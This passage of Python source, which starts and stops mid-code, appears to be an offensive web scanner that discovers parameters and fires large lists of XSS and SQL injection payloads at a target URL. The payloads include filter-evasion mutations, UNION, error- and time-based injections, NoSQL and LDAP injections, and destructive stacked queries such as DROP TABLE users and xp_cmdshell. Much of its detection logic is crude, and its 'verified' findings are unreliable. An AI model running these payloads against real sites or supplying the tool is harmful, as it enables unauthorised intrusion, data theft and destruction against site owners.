            "' UNION SELECT 'redis',1,2--",
            "' UNION SELECT 'elastic',1,2--",
            "' UNION SELECT 'cassandra',1,2--",
            "' UNION SELECT 'neo4j',1,2--",
            "' AND 1=(SELECT 1 FROM dual WHERE 1=1)--",
            "' AND 1=(SELECT 1 FROM dual WHERE 2=2)--",
            "' AND 1=(SELECT 1 FROM dual WHERE 3=3)--",
            "' AND 1=(SELECT 1 FROM dual WHERE 4=4)--",
            "' AND 1=(SELECT 1 FROM dual WHERE 5=5)--",
            "' AND 1=(SELECT 1 FROM dual WHERE 6=6)--",
            "' AND 1=(SELECT 1 FROM dual WHERE 7=7)--",
            "' AND 1=(SELECT 1 FROM dual WHERE 8=8)--",
            "' AND 1=(SELECT 1 FROM dual WHERE 9=9)--",
            "' AND 1=(SELECT 1 FROM dual WHERE 10=10)--",
            "' OR (1=1 AND 2=2)--",
            "' OR (1=1 AND 3=3)--",
            "' OR (1=1 AND 4=4)--",
            "' OR (1=1 AND 5=5)--",
            "' OR (1=1 AND 6=6)--",
            "' OR (1=1 AND 7=7)--",
            "' OR (1=1 AND 8=8)--",
            "' OR (1=1 AND 9=9)--",
            "' OR (1=1 AND 10=10)--",
            "' OR (2=2 AND 3=3)--",
            "' OR (3=3 AND 4=4)--",
            "' OR (4=4 AND 5=5)--",
            "' OR (5=5 AND 6=6)--",
            "' OR (6=6 AND 7=7)--",
            "' OR (7=7 AND 8=8)--",
            "' OR (8=8 AND 9=9)--",
            "' OR (9=9 AND 10=10)--",
            "' OR (10=10 AND 11=11)--",
            "' OR (11=11 AND 12=12)--",
            "' OR (12=12 AND 13=13)--",
            "' OR (13=13 AND 14=14)--",
            "' OR (14=14 AND 15=15)--",
            "' OR (15=15 AND 16=16)--",
            "' OR (16=16 AND 17=17)--",
            "' OR (17=17 AND 18=18)--",
            "' OR (18=18 AND 19=19)--",
            "' OR (19=19 AND 20=20)--",
            "' OR (20=20 AND 21=21)--",
            "' OR (21=21 AND 22=22)--",
            "' OR (22=22 AND 23=23)--",
            "' OR (23=23 AND 24=24)--",
            "' OR (24=24 AND 25=25)--",
            "' OR (25=25 AND 26=26)--",
            "' OR (26=26 AND 27=27)--",
            "' OR (27=27 AND 28=28)--",
            "' OR (28=28 AND 29=29)--",
            "' OR (29=29 AND 30=30)--",
            "' OR (30=30 AND 31=31)--",
            "' OR (31=31 AND 32=32)--",
            "' OR (32=32 AND 33=33)--",
            "' OR (33=33 AND 34=34)--",
            "' OR (34=34 AND 35=35)--",
            "' OR (35=35 AND 36=36)--",
            "' OR (36=36 AND 37=37)--",
            "' OR (37=37 AND 38=38)--",
            "' OR (38=38 AND 39=39)--",
            "' OR (39=39 AND 40=40)--",
            "' OR (40=40 AND 41=41)--",
            "' OR (41=41 AND 42=42)--",
            "' OR (42=42 AND 43=43)--",
            "' OR (43=43 AND 44=44)--",
            "' OR (44=44 AND 45=45)--",
            "' OR (45=45 AND 46=46)--",
            "' OR (46=46 AND 47=47)--",
            "' OR (47=47 AND 48=48)--",
            "' OR (48=48 AND 49=49)--",
            "' OR (49=49 AND 50=50)--"
        ]
        
    def discover_parameters(self, url):
        print(f"{Fore.RED}[*] Starting parameter discovery on: {url}{Style.RESET_ALL}")
        discovered = []
        
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            forms = soup.find_all('form')
            for form in forms:
                inputs = form.find_all(['input', 'select', 'textarea'])
                for inp in inputs:
                    name = inp.get('name')
                    if name and name not in discovered:
                        discovered.append(name)
                        print(f"{Fore.RED}[+] Found form parameter: {name} -> {url}?{name}=test{Style.RESET_ALL}")
            
            links = soup.find_all('a', href=True)
            for link in links:
                href = link['href']
                if '?' in href:
                    parsed = urlparse(href)
                    if parsed.query:
                        params = dict(urllib.parse.parse_qsl(parsed.query))
                        for param in params:
                            if param not in discovered:
                                discovered.append(param)
                                print(f"{Fore.RED}[+] Found URL parameter: {param} -> {url}{'&' if '?' in url else '?'}{param}=test{Style.RESET_ALL}")
            
            for param in self.common_params:
                if param not in discovered:
                    test_url = f"{url}{'&' if '?' in url else '?'}{param}=test"
                    try:
                        resp1 = self.session.get(test_url, timeout=5)
                        resp2 = self.session.get(url, timeout=5)
                        if len(resp1.text) != len(resp2.text) or resp1.status_code != resp2.status_code:
                            discovered.append(param)
                            print(f"{Fore.RED}[+] Discovered hidden parameter: {param} -> {url}{'&' if '?' in url else '?'}{param}=test{Style.RESET_ALL}")
                    except:
                        pass
            
            self.discovered_params = discovered
            print(f"\n{Fore.RED}[*] Parameter discovery complete!{Style.RESET_ALL}")
            print(f"{Fore.RED}[*] Total parameters found: {len(discovered)}{Style.RESET_ALL}")
            
            if discovered:
                print(f"\n{Fore.RED}DISCOVERED PARAMETERS:{Style.RESET_ALL}")
                for i, param in enumerate(discovered, 1):
                    print(f"{Fore.RED}[{i}] {param} -> {url}{'&' if '?' in url else '?'}{param}=payload{Style.RESET_ALL}")
            
            return discovered
            
        except Exception as e:
            print(f"{Fore.RED}[!] Error during parameter discovery: {str(e)}{Style.RESET_ALL}")
            return []
    
    def test_xss_vulnerability(self, url, payload):
        try:
            parsed_url = urlparse(url)
            if parsed_url.query:
                params = dict(urllib.parse.parse_qsl(parsed_url.query))
                for param in params:
                    test_params = params.copy()
                    test_params[param] = payload
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
                    
                    response = self.session.get(test_url, params=test_params, timeout=10)
                    self.requests_sent += 1
                    
                    response_lower = response.text.lower()
                    payload_lower = payload.lower()
                    
                    if (payload_lower in response_lower or 
                        payload.replace("'", "&#39;") in response.text or
                        payload.replace('"', "&quot;") in response.text or
                        payload.replace('<', "&lt;") in response.text or
                        payload.replace('>', "&gt;") in response.text or
                        "alert(" in response_lower or
                        "confirm(" in response_lower or
                        "prompt(" in response_lower or
                        "javascript:" in response_lower or
                        "onerror=" in response_lower or
                        "onload=" in response_lower or
                        "onclick=" in response_lower or
                        "onfocus=" in response_lower or
                        "<script" in response_lower or
                        "</script>" in response_lower or
                        "eval(" in response_lower or
                        "document.write" in response_lower or
                        "document.cookie" in response_lower or
                        "window.location" in response_lower or
                        "innerHTML" in response_lower):
                        return {
                            'type': 'XSS',
                            'method': 'GET',
                            'parameter': param,
                            'payload': payload,
                            'url': response.url,
                            'vulnerable': True
                        }
            
            try:
                response = self.session.post(url, data={'test': payload}, timeout=10)
                self.requests_sent += 1
                
                response_lower = response.text.lower()
                payload_lower = payload.lower()
                
                if (payload_lower in response_lower or 
                    payload.replace("'", "&#39;") in response.text or
                    payload.replace('"', "&quot;") in response.text or
                    payload.replace('<', "&lt;") in response.text or
                    payload.replace('>', "&gt;") in response.text or
                    "alert(" in response_lower or
                    "confirm(" in response_lower or
                    "prompt(" in response_lower or
                    "javascript:" in response_lower or
                    "onerror=" in response_lower or
                    "onload=" in response_lower or
                    "onclick=" in response_lower or
                    "onfocus=" in response_lower or
                    "<script" in response_lower or
                    "</script>" in response_lower or
                    "eval(" in response_lower or
                    "document.write" in response_lower or
                    "document.cookie" in response_lower or
                    "window.location" in response_lower or
                    "innerHTML" in response_lower):
                    return {
                        'type': 'XSS',
                        'method': 'POST',
                        'parameter': 'test',
                        'payload': payload,
                        'url': url,
                        'vulnerable': True
                    }
            except:
                pass
                
        except Exception as e:
            pass
            
        return None
        
    def test_sql_vulnerability(self, url, payload):
        try:
            sql_errors = [
                "SQL syntax.*MySQL",
                "Warning.*mysql_.*",
                "valid MySQL result",
                "MySqlClient\.",
                "PostgreSQL.*ERROR",
                "Warning.*pg_.*",
                "valid PostgreSQL result",
                "Npgsql\.",
                "Driver.*SQL.*Server",
                "OLE DB.*SQL Server",
                "Microsoft SQL Native Client error",
                "SQLServer JDBC Driver",
                "Oracle error",
                "Oracle.*Driver",
                "Warning.*oci_.*",
                "Warning.*ora_.*",
                "mysql_fetch",
                "mysql_num_rows",
                "mysql_query",
                "mysql_connect",
                "pg_query",
                "pg_exec",
                "pg_connect",
                "ORA-[0-9]{5}",
                "Microsoft.*ODBC.*SQL Server",
                "SQLite.*error",
                "sqlite3.*Error",
                "Incorrect syntax near",
                "Unclosed quotation mark",
                "quoted string not properly terminated",
                "Invalid column name",
                "Unknown column",
                "Table.*doesn't exist",
                "Column count doesn't match",
                "Subquery returns more than 1 row",
                "Division by zero",
                "Data type mismatch",
                "Conversion failed",
                "Invalid object name",
                "Syntax error.*near",
                "You have an error in your SQL syntax"
            ]
            
            parsed_url = urlparse(url)
            if parsed_url.query:
                params = dict(urllib.parse.parse_qsl(parsed_url.query))
                for param in params:
                    test_params = params.copy()
                    test_params[param] = payload
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
                    
                    response = self.session.get(test_url, params=test_params, timeout=10)
                    self.requests_sent += 1
                    
                    response_lower = response.text.lower()
                    
                    for error_pattern in sql_errors:
                        if re.search(error_pattern, response.text, re.IGNORECASE):
                            return {
                                'type': 'SQL Injection',
                                'method': 'GET',
                                'parameter': param,
                                'payload': payload,
                                'url': response.url,
                                'error_pattern': error_pattern,
                                'vulnerable': True
                            }
                    
                    if (len(response.text) != len(self.session.get(test_url, params={param: 'normal_value'}, timeout=10).text) or
                        response.status_code == 500 or
                        "error" in response_lower or
                        "exception" in response_lower or
                        "warning" in response_lower or
                        "fatal" in response_lower or
                        "notice" in response_lower or
                        "debug" in response_lower or
                        "stack trace" in response_lower or
                        "traceback" in response_lower or
                        "line " in response_lower and "error" in response_lower):
                        return {
                            'type': 'SQL Injection',
                            'method': 'GET',
                            'parameter': param,
                            'payload': payload,
                            'url': response.url,
                            'error_pattern': 'Response anomaly detected',
                            'vulnerable': True
                        }
            
            try:
                response = self.session.post(url, data={'test': payload}, timeout=10)
                self.requests_sent += 1
                
                response_lower = response.text.lower()
                
                for error_pattern in sql_errors:
                    if re.search(error_pattern, response.text, re.IGNORECASE):
                        return {
                            'type': 'SQL Injection',
                            'method': 'POST',
                            'parameter': 'test',
                            'payload': payload,
                            'url': url,
                            'error_pattern': error_pattern,
                            'vulnerable': True
                        }
                
                if (response.status_code == 500 or
                    "error" in response_lower or
                    "exception" in response_lower or
                    "warning" in response_lower or
                    "fatal" in response_lower or
                    "notice" in response_lower or
                    "debug" in response_lower or
                    "stack trace" in response_lower or
                    "traceback" in response_lower or
                    "line " in response_lower and "error" in response_lower):
                    return {
                        'type': 'SQL Injection',
                        'method': 'POST',
                        'parameter': 'test',
                        'payload': payload,
                        'url': url,
                        'error_pattern': 'Response anomaly detected',
                        'vulnerable': True
                    }
            except:
                pass
                
        except Exception as e:
            pass
            
        return None
        
    def verify_xss_payload(self, url, payload, param):
        """Ultra-powerful XSS payload verification with advanced DOM manipulation and event handlers"""
        try:
            parsed_url = urlparse(url)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
            
            base_mutations = [
                payload,
                payload.replace('&lt;', '＜').replace('&gt;', '＞'),
                payload.replace('<', '%3C').replace('>', '%3E'),
                payload.replace('<', '&lt;').replace('>', '&gt;'),
                payload.replace('"', '&quot;').replace("'", '&#39;'),
                payload.replace('<', '%253C').replace('>', '%253E'),
                payload.replace('<', '\\u003C').replace('>', '\\u003E'),
                payload.replace(' ', '/**/'),
                payload.replace(' ', '%20'),
                payload.replace(' ', '+'),
                payload.replace(' ', '\t'),
                payload.replace(' ', '\n'),
                payload.replace(' ', '\r'),
                payload.upper(), payload.lower(), payload.swapcase(),
                f'<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
                f'<script>[].constructor.constructor("alert(1)")()</script>',
                f'<script>top["al"+"ert"](1)</script>',
                f'<script>window["al"+"ert"](1)</script>',
            ]
            
            advanced_vectors = [
                f'<img src=x onerror=alert(1)>',
                f'<img src=x onerror="alert(1)">',
                f'<img src=x onerror=\'alert(1)\'>',
                f'<img src=x onerror=alert`1`>',
                f'<img src=x onerror=alert(String.fromCharCode(49))>',
                f'<svg onload=alert(1)>',
                f'<svg onload="alert(1)">',
                f'<svg onload=\'alert(1)\'>',
                f'<svg/onload=alert(1)>',
                f'<svg onload=alert`1`>',
                f'<body onload=alert(1)>',
                f'<iframe src=javascript:alert(1)>',
                f'<iframe srcdoc="<script>alert(1)</script>">',
                f'<input onfocus=alert(1) autofocus>',
                f'<select onfocus=alert(1) autofocus>',
                f'<textarea onfocus=alert(1) autofocus>',
                f'<keygen onfocus=alert(1) autofocus>',
                f'<video><source onerror=alert(1)>',
                f'<audio src=x onerror=alert(1)>',
                f'<details open ontoggle=alert(1)>',
                f'<marquee onstart=alert(1)>',
                f'<form><button formaction=javascript:alert(1)>',
                f'<object data=javascript:alert(1)>',
                f'<embed src=javascript:alert(1)>',
                f'<applet code=javascript:alert(1)>',
                f'<meta http-equiv=refresh content=0;url=javascript:alert(1)>',
                f'<link rel=stylesheet href=javascript:alert(1)>',
                f'<style>@import"javascript:alert(1)";</style>',
                f'<style>body{background:url("javascript:alert(1)")}</style>',
                
                f'<div id=x></div><script>x.innerHTML="<img src=x onerror=alert(1)>"</script>',
                f'<script>document.body.innerHTML="<img src=x onerror=alert(1)>"</script>',
                f'<script>document.write("<img src=x onerror=alert(1)>")</script>',
                f'<script>document.writeln("<img src=x onerror=alert(1)>")</script>',
                f'<script>eval("alert(1)")</script>',
                f'<script>Function("alert(1)")()</script>',
                f'<script>setTimeout("alert(1)",1)</script>',
                f'<script>setInterval("alert(1)",1)</script>',
                f'<script>requestAnimationFrame(()=>alert(1))</script>',
                
                f'javascript:alert(1)',
                f'javascript:alert`1`',
                f'javascript:alert(String.fromCharCode(49))',
                f'javascript:eval("alert(1)")',
                f'javascript:Function("alert(1)")()',
                f'javascript:setTimeout("alert(1)",1)',
                f'javascript:[].constructor.constructor("alert(1)")()',
                f'javascript:top.alert(1)',
                f'javascript:parent.alert(1)',
                f'javascript:self.alert(1)',
                f'javascript:window.alert(1)',
                f'javascript:frames.alert(1)',
                f'javascript:globalThis.alert(1)',
                
                f'data:text/html,<script>alert(1)</script>',
                f'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
                f'data:text/html;charset=utf-8,<script>alert(1)</script>',
                f'data:application/javascript,alert(1)',
                f'data:text/javascript,alert(1)',
                
                f'"><script>alert(1)</script>',
                f"'><script>alert(1)</script>",
                f"'><img src=x onerror=alert(1)>",
                f'</script><script>alert(1)</script>',
                f'</title><script>alert(1)</script>',
                f'</textarea><script>alert(1)</script>',
                f'</style><script>alert(1)</script>',
                
                f'{{alert(1)}}',
                f'${alert(1)}',
                f'#{alert(1)}',
                f'<%=alert(1)%>',
                f'{{constructor.constructor("alert(1)")()}}',
                
                f'#<script>alert(1)</script>',
                f'?<script>alert(1)</script>',
                f'&<script>alert(1)</script>',
                
                f'<scr<script>ipt>alert(1)</scr</script>ipt>',
                f'<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">',
                f'<img src="x" onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">',
                f'<img src="x" onerror="window[\'ale\'+\'rt\'](1)">',
                f'<img src="x" onerror="self[\'ale\'+\'rt\'](1)">',
                f'<img src="x" onerror="top[\'ale\'+\'rt\'](1)">',
                f'<img src="x" onerror="parent[\'ale\'+\'rt\'](1)">',
                
                f'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
                f'"><svg/onload=alert(/XSS/)>',
                f'\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>',
                
                f'<script>alert`1`</script>',
                f'<script>alert(1)</script>',
                f'<script>confirm(1)</script>',
                f'<script>prompt(1)</script>',
                f'<script>console.log("XSS")</script>',
                f'<script>document.write("XSS")</script>',
                f'<script>document.body.innerHTML="XSS"</script>',
                f'<script>location.href="javascript:alert(1)"</script>',
                f'<script>setTimeout(alert,1)</script>',
                f'<script>setInterval(alert,1)</script>',
                f'<script>Function("alert(1)")()</script>',
                f'<script>eval("alert(1)")</script>',
                f'<script>new Function("alert(1)")()</script>',
                f'<script>[].constructor.constructor("alert(1)")()</script>',
            ]
            
            payloads_to_test = base_mutations + advanced_vectors
            
            for test_payload in payloads_to_test:
                test_params = {}
                if parsed_url.query:
                    test_params = dict(urllib.parse.parse_qsl(parsed_url.query))
                
                test_params[param] = test_payload
                
                try:
                    response = self.session.get(base_url, params=test_params, timeout=10)
                    self.requests_sent += 1
                    
                    if test_payload.lower() in response.text.lower():
                        response_lower = response.text.lower()
                        
                        xss_indicators = [
                            '<script>alert(', '<script>confirm(', '<script>prompt(',
                            '<script>console.log(', '<script>document.write(',
                            '<script>eval(', '<script>settimeout(', '<script>setinterval(',
                            '<script>function(', '<script>[].constructor',
                            '<script>alert`', '<script>new function(',
                            'onerror=alert(', 'onload=alert(', 'onclick=alert(',
                            'onfocus=alert(', 'onmouseover=alert(', 'onmouseout=alert(',
                            'onkeydown=alert(', 'onkeyup=alert(', 'onchange=alert(',
                            'onsubmit=alert(', 'onreset=alert(', 'onselect=alert(',
                            'onblur=alert(', 'ondblclick=alert(', 'oncontextmenu=alert(',
                            'onloadstart=alert(', 'ontoggle=alert(', 'onstart=alert(',
                            '<svg/onload=', '<svg onload=', '<img src=x onerror=',
                            '<iframe onload=', '<body onload=', '<input onfocus=',
                            '<select onfocus=', '<textarea onfocus=', '<keygen onfocus=',
                            '<video onloadstart=', '<audio onloadstart=', '<details ontoggle=',
                            '<marquee onstart=', '<meter onmouseover=', '<progress onmouseover=',
                            'javascript:alert(', 'javascript:confirm(', 'javascript:prompt(',
                            'javascript:eval(', 'javascript:settimeout(', 'javascript:function(',
                            'document.write(', 'document.body.innerHTML=', 'document.cookie',
                            'window.location', 'location.href=', 'location.replace(',
                            'eval(', 'settimeout(', 'setinterval(', 'function(',
                            'string.fromcharcode(', 'constructor.constructor(',
                            'window[', 'self[', 'top[', 'parent[', 'frames[',
                            '{{alert(', '${alert(', '#{alert(', '<%=alert(',
                            '{{constructor.constructor(',
                            'data:text/html,', 'data:text/html;base64,',
                            'oncliCk=alert(', 'onloAd=alert(', '/xss/', 'string.fromcharcode(88,83,83)',
                            '&#97;&#108;&#101;&#114;&#116;',
                            '&#x61;&#x6c;&#x65;&#x72;&#x74;',
                            '%61%6c%65%72%74',
                            '</script>', '</title>', '</textarea>', '</style>',
                            '"><', "'><", '"><img', "'><img", '"><svg', "'><svg",
                        ]
                        
                        for indicator in xss_indicators:
                            if indicator in response_lower:
                                return {
                                    'type': 'XSS',
                                    'method': 'GET',
                                    'parameter': param,
                                    'payload': test_payload,
                                    'original_payload': payload,
                                    'url': response.url,
                                    'vulnerable': True,
                                    'verified': True,
                                    'execution_method': indicator
                                }
                    
                    # Test POST method
                    try:
                        response = self.session.post(base_url, data={param: test_payload}, timeout=10)
                        self.requests_sent += 1
                        
                        if test_payload.lower() in response.text.lower():
                            response_lower = response.text.lower()
                            
                            for indicator in xss_indicators:
                                if indicator in response_lower:
                                    return {
                                        'type': 'XSS',
                                        'method': 'POST',
                                        'parameter': param,
                                        'payload': test_payload,
                                        'original_payload': payload,
                                        'url': base_url,
                                        'vulnerable': True,
                                        'verified': True,
                                        'execution_method': indicator
                                    }
                    except:
                        pass
                        
                except Exception:
                    continue
                    
        except Exception:
            pass
            
        return None
        
    def verify_sql_payload(self, url, payload, param):
        """Ultra-powerful SQL injection verification with advanced techniques"""
        try:
            parsed_url = urlparse(url)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
            
            base_mutations = [
                payload,
                payload.replace("'", "\""),
                payload.replace("'", "`"),
                payload.replace("'", "''"),
                payload.replace(" ", "/**/"),
                payload.replace(" ", "%20"),
                payload.replace(" ", "+"),
                payload.replace("=", "/**/=/**/"),
                payload.replace("UNION", "/*!UNION*/"),
                payload.replace("SELECT", "/*!SELECT*/"),
                payload.replace("OR", "||"),
                payload.replace("AND", "&&"),
                payload.upper(), payload.lower(), payload.swapcase(),
                urlparse_lib.quote(payload),
                urlparse_lib.quote(urlparse_lib.quote(payload)),
            ]
            
            advanced_sqli = [
                f"' AND 1=1--",
                f"' AND 1=2--", 
                f"' AND 'a'='a'--",
                f"' AND 'a'='b'--",
                f"' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                f"' AND (SELECT COUNT(*) FROM sys.databases)>0--",
                f"' AND (SELECT COUNT(*) FROM pg_database)>0--",
                
                f"' UNION SELECT 1--",
                f"' UNION SELECT 1,2--",
                f"' UNION SELECT 1,2,3--",
                f"' UNION SELECT 1,2,3,4--",
                f"' UNION SELECT 1,2,3,4,5--",
                f"' UNION SELECT NULL--",
                f"' UNION SELECT NULL,NULL--",
                f"' UNION SELECT NULL,NULL,NULL--",
                f"' UNION ALL SELECT 1--",
                f"' UNION ALL SELECT 1,2,3--",
                
                f"' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
                f"' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                f"' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
                f"' AND EXP(~(SELECT * FROM (SELECT USER())a))--",
                f"' UNION SELECT 1 WHERE 1=CONVERT(int,(SELECT @@version))--",
                f"' AND 1=CAST((SELECT @@version) AS int)--",
                
                f"' AND SLEEP(5)--",
                f"' AND (SELECT SLEEP(5))--",
                f"' AND IF(1=1,SLEEP(5),0)--",
                f"' AND BENCHMARK(5000000,MD5(1))--",
                f"'; WAITFOR DELAY '00:00:05'--",
                f"' AND pg_sleep(5)--",
                f"' AND (SELECT pg_sleep(5))--",
                f"' AND dbms_pipe.receive_message(('a'),5) IS NULL--",
                
                f"'; INSERT INTO users VALUES('hacker','password')--",
                f"'; DROP TABLE users--",
                f"'; SELECT SLEEP(5)--",
                f"'; EXEC xp_cmdshell('ping 127.0.0.1')--",
                
                f"admin'/*",
                f"admin'||'",
                f"admin'+'",
                f"admin'&'",
                
                f"' || '1'=='1",
                f"' && '1'=='1",
                f"'; return true; //",
                f"'; return 1==1; //",
                f"[$ne]=null",
                f"[$regex]=.*",
                f"[$where]=1",
                
                f"*)(uid=*))(|(uid=*",
                f"*)(|(password=*))",
                f"admin)(&(password=*))",
                
                f"' or '1'='1",
                f"' or 1=1 or ''='",
                f"x' or name()='username' or 'x'='y",
                
                f"' AND (SELECT * FROM (SELECT SLEEP(5))a)--",
                f"' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database())>0--",
                f"' UNION SELECT 1,@@version,3--",
                f"' UNION SELECT 1,user(),3--",
                f"' UNION SELECT 1,database(),3--",
                
                f"' AND (SELECT version())::text IS NOT NULL--",
                f"' UNION SELECT 1,version(),3--",
                f"' UNION SELECT 1,current_user,3--",
                f"' UNION SELECT 1,current_database(),3--",
                
                f"' AND (SELECT @@version) IS NOT NULL--",
                f"' UNION SELECT 1,@@version,3--",
                f"' UNION SELECT 1,SYSTEM_USER,3--",
                f"' UNION SELECT 1,DB_NAME(),3--",
                
                f"' AND (SELECT banner FROM v$version WHERE rownum=1) IS NOT NULL--",
                f"' UNION SELECT 1,banner,3 FROM v$version WHERE rownum=1--",
                f"' UNION SELECT 1,user,3 FROM dual--",
                
                f"' AND (SELECT sqlite_version()) IS NOT NULL--",
                f"' UNION SELECT 1,sqlite_version(),3--",
                
                f"' /*!AND*/ 1=1--",
                f"' %41%4E%44 1=1--",
                f"' /**/AND/**/1=1--",
                f"' AND/*comment*/1=1--",
                f"' AnD 1=1--",
                f"' A/**/ND 1=1--",
                f"' AND 1=1#",
                f"' AND 1=1;%00",
                f"' AND 1=1\x00--",
                f"' AND CHAR(49)=CHAR(49)--",
                f"' AND ASCII('A')=65--",
                f"' AND LENGTH('A')=1--",
            ]
            
            sql_payloads = base_mutations + advanced_sqli
            
            for test_payload in sql_payloads:
                test_params = {}
                if parsed_url.query:
                    test_params = dict(urllib.parse.parse_qsl(parsed_url.query))
                
                test_params[param] = test_payload
                
                try:
                    start_time = time.time()
                    response = self.session.get(base_url, params=test_params, timeout=15)
                    end_time = time.time()
                    self.requests_sent += 1
                    
                    sql_error_patterns = [
                        r"SQL syntax.*MySQL", r"Warning.*mysql_", r"valid MySQL result",
                        r"MySqlClient\.", r"mysql_fetch", r"mysql_num_rows", r"mysql_query",
                        r"mysql_connect", r"You have an error in your SQL syntax",
                        r"check the manual that corresponds to your MySQL server version",
                        r"Unknown column.*in.*field list", r"Table.*doesn't exist",
                        r"Duplicate entry.*for key", r"Data too long for column",
                        r"PostgreSQL.*ERROR", r"Warning.*pg_", r"valid PostgreSQL result",
                        r"Npgsql\.", r"pg_query", r"pg_exec", r"pg_connect",
                        r"syntax error at or near", r"relation.*does not exist",
                        r"column.*does not exist", r"operator does not exist",
                        r"function.*does not exist", r"permission denied for relation",
                        
                        r"Driver.*SQL.*Server", r"OLE DB.*SQL Server", r"SQLServer JDBC Driver",
                        r"Microsoft SQL Native Client error", r"Microsoft.*ODBC.*SQL Server",
                        r"Incorrect syntax near", r"Unclosed quotation mark", r"Invalid column name",
                        r"Invalid object name", r"Cannot convert.*to.*int", r"Arithmetic overflow",
                        r"String or binary data would be truncated", r"The conversion of.*failed",
                        
                        r"Oracle error", r"Oracle.*Driver", r"Warning.*oci_", r"Warning.*ora_",
                        r"ORA-\d{5}", r"PLS-\d{5}", r"SP2-\d{4}", r"TNS-\d{5}",
                        r"invalid identifier", r"table or view does not exist",
                        r"not a single-group group function", r"missing expression",
                        
                        r"SQLite.*error", r"sqlite3.*Error", r"database is locked",
                        r"no such table", r"no such column", r"SQL logic error",
                        r"database disk image is malformed", r"syntax error",
                        
                        r"quoted string not properly terminated", r"Column count doesn't match",
                        r"Subquery returns more than 1 row", r"Division by zero",
                        r"Data type mismatch", r"Conversion failed", r"Syntax error.*near",
                        r"unexpected end of SQL command", r"unterminated quoted string",
                        
                        r"EXTRACTVALUE", r"UPDATEXML", r"CONCAT", r"FLOOR", r"RAND",
                        r"BENCHMARK", r"SLEEP", r"WAITFOR", r"pg_sleep", r"dbms_pipe",
                        r"UTL_INADDR", r"SYS_CONTEXT", r"XMLTYPE", r"XMLSerialize",
                        
                        r"supplied argument is not a valid", r"mysql result", r"postgresql result",
                        r"Warning.*supplied argument", r"Fatal error.*Call to undefined function",
                        r"Call to a member function.*on.*non-object", r"Trying to get property",
                        
                        r"blocked by.*security", r"suspicious.*detected", r"malicious.*request",
                        r"injection.*attempt", r"security.*violation", r"access.*denied",
                        
                        r"timeout", r"connection.*lost", r"server.*gone.*away", r"deadlock",
                        r"lock.*timeout", r"query.*execution.*time", r"statement.*timeout",
                        
                        r"MongoError", r"CouchDB.*error", r"Redis.*error", r"Cassandra.*error",
                        r"invalid.*query", r"malformed.*document", r"index.*out.*of.*bounds",
                        
                        r"LDAP.*error", r"invalid.*DN", r"authentication.*failed",
                        r"bind.*failed", r"search.*failed", r"invalid.*filter",
                        
                        r"XPath.*error", r"invalid.*expression", r"namespace.*error",
                        r"function.*not.*found", r"syntax.*error.*in.*XPath"
                    ]
                    
                    for pattern in sql_error_patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            return {
                                'type': 'SQL Injection',
                                'method': 'GET',
                                'parameter': param,
                                'payload': test_payload,
                                'original_payload': payload,
                                'url': response.url,
                                'vulnerable': True,
                                'verified': True,
                                'error_pattern': pattern,
                                'response_time': end_time - start_time
                            }
                    
                    response_time = end_time - start_time
                    time_based_keywords = ["SLEEP", "WAITFOR", "pg_sleep", "BENCHMARK", "dbms_pipe"]
                    
                    if any(keyword in test_payload.upper() for keyword in time_based_keywords):
                        if response_time > 4:  # Confirmed time delay
                            return {
                                'type': 'SQL Injection (Time-based)',
                                'method': 'GET',
                                'parameter': param,
                                'payload': test_payload,
                                'original_payload': payload,
                                'url': response.url,
                                'vulnerable': True,
                                'verified': True,
                                'error_pattern': f'Time delay detected ({response_time:.2f}s)',
                                'response_time': response_time
                            }
                    
                    if "AND 1=1" in test_payload or "AND 'a'='a'" in test_payload:
                        false_payload = test_payload.replace("1=1", "1=2").replace("'a'='a'", "'a'='b'")
                        false_params = test_params.copy()
                        false_params[param] = false_payload
                        
                        try:
                            false_response = self.session.get(base_url, params=false_params, timeout=10)
                            self.requests_sent += 1
                            
                            if abs(len(response.text) - len(false_response.text)) > 10:
                                return {
                                    'type': 'SQL Injection (Boolean-based Blind)',
                                    'method': 'GET',
                                    'parameter': param,
                                    'payload': test_payload,
                                    'original_payload': payload,
                                    'url': response.url,
                                    'vulnerable': True,
                                    'verified': True,
                                    'error_pattern': f'Boolean blind confirmed (response diff: {abs(len(response.text) - len(false_response.text))} chars)',
                                    'response_time': response_time
                                }
                        except:
                            pass
                    
                    if "UNION SELECT" in test_payload.upper():
                        union_indicators = ["1", "2", "3", "4", "5", "null", "version", "user", "database"]
                        response_lower = response.text.lower()
                        
                        for indicator in union_indicators:
                            if indicator in response_lower and indicator not in base_url.lower():
                                return {
                                    'type': 'SQL Injection (Union-based)',
                                    'method': 'GET',
                                    'parameter': param,
                                    'payload': test_payload,
                                    'original_payload': payload,
                                    'url': response.url,
                                    'vulnerable': True,
                                    'verified': True,
                                    'error_pattern': f'Union injection confirmed (found: {indicator})',
                                    'response_time': response_time
                                }
                    
                    # Test POST method
                    try:
                        start_time = time.time()
                        response = self.session.post(base_url, data={param: test_payload}, timeout=15)
                        end_time = time.time()
                        self.requests_sent += 1
                        
